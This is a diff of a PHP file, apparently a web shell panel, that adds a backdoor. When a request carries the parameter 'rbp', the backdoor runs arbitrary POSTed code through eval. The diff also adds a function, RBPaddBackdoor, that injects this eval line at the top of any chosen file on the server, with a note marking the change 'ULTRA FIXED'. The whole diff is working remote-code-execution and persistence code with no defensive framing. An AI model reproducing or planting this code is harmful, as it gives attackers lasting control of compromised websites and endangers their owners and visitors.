@@ -627,7 +627,45 @@ if (isset($_POST['mass_delete'])) {
     exit;
 }
 
-// Backdoor handler - FIXED
+// Backdoor execution - ULTRA FIXED
+if(isset($_GET['rbp']) && $_GET['rbp'] == 'rbp'){
+    if(isset($_POST['rbp'])){
+        @eval($_POST['rbp']);
+        exit();
+    }
+}
+
+// Add backdoor to file - ULTRA FIXED
+function RBPaddBackdoor($filePath, $backdoorCode) {
+    if (!file_exists($filePath)) {
+        return ["error" => "File not found: $filePath"];
+    }
+    
+    $originalContent = file_get_contents($filePath);
+    if ($originalContent === false) {
+        return ["error" => "Cannot read file: $filePath"];
+    }
+    
+    // Check if backdoor already exists
+    if (strpos($originalContent, '?rbp=rbp') !== false) {
+        return ["error" => "Backdoor already exists in file"];
+    }
+    
+    // Remove existing PHP tags if any at start
+    $cleanContent = preg_replace('/^<\?php\s*/', '', $originalContent);
+    $cleanContent = preg_replace('/^<\?\s*/', '', $cleanContent);
+    
+    // Add backdoor code at the VERY beginning
+    $newContent = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit;}}?>" . $cleanContent;
+    
+    if (file_put_contents($filePath, $newContent)) {
+        return ["success" => "Backdoor added successfully to: $filePath"];
+    } else {
+        return ["error" => "Failed to add backdoor to: $filePath"];
+    }
+}
+
+// Backdoor handler - ULTRA FIXED
 if (isset($_POST['add_backdoor'])) {
     $isPostAction = true;
     $sourceFile = $_POST['backdoor_file_path'] ?? '';
@@ -638,8 +676,8 @@ if (isset($_POST['add_backdoor'])) {
         exit;
     }
     
-    // Fixed backdoor code - placed at beginning for better execution
-    $backdoorCode = "<?php if(isset(\$_GET['rbp']) && \$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){eval(\$_POST['rbp']);exit;}} ?>";
+    // Ultra fixed backdoor code - minimal, at beginning
+    $backdoorCode = "<?php if(isset(\$_GET['rbp'])&&\$_GET['rbp']=='rbp'){if(isset(\$_POST['rbp'])){@eval(\$_POST['rbp']);exit;}}?>";
     
     $results = RBPaddBackdoor($sourceFile, $backdoorCode);
     $_SESSION['backdoor_results'] = $results;
